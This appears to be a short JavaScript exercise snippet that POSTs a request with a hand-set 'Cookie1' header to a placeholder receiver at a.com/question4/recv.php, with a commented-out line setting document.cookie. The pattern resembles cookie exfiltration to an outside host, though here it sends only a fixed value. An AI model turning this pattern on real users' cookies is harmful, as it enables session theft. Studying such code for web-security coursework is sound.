var req = new XMLHttpRequest();
req.open('POST', 'http://a.com/question4/recv.php');
req.setRequestHeader('Cookie1', 'Cookie1=13');
req.send();
//document.cookie = "Cookie1" + '=42; expires = Thu, 01 Jan 2020 00:00:00 GMT';
